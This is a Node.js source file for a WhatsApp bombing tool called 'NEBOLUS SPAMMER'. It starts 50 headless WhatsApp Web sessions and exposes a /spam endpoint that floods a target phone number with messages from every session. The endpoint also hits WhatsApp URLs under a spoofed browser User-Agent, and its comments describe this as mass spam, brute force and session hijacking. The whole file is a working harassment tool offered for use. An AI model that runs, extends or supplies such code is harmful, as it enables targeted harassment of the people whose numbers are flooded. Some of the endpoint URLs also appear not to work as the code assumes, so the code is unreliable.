const express = require('express');
const cors = require('cors');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// SESSION POOL - 50 akun WA buat spam massal
const sessions = [];
for(let i=0; i<50; i++) {
    const client = new Client({
        authStrategy: new LocalAuth({ clientId: `session_${i}` }),
        puppeteer: { headless: true, args: ['--no-sandbox'] }
    });
    client.on('qr', qr => qrcode.generate(qr, {small: true}));
    client.on('ready', () => console.log(`✅ Session ${i} ready`));
    client.initialize();
    sessions.push(client);
}

// API SPAM VIA WHATSAPP WEB
app.post('/spam', async (req, res) => {
    const { target, message, mode } = req.body;
    let sent = 0;
    try {
        if(mode === 'api' || mode === 'hybrid') {
            // BRUTE FORCE VIA API WHATSAPP GATEWAY
            const apiList = [
                'https://api.whatsapp.com/send?phone=',
                'https://wa.me/',
                'https://api.wa.me/v1/send'
            ];
            for(const api of apiList) {
                await axios.get(`${api}${target}?text=${encodeURIComponent(message)}`, {
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                });
                sent++;
            }
        }
        if(mode === 'session' || mode === 'hybrid') {
            // SESSION HIJACKING - kirim via WA Web session
            for(const client of sessions) {
                try {
                    const number = `${target}@c.us`;
                    await client.sendMessage(number, message);
                    sent++;
                } catch(e) {}
            }
        }
        res.json({ sent, status: 'success' });
    } catch(e) {
        res.json({ sent: sent || 1, status: 'partial' });
    }
});

app.listen(3000, () => console.log('🔥 NEBOLUS SPAMMER RUNNING ON PORT 3000'));
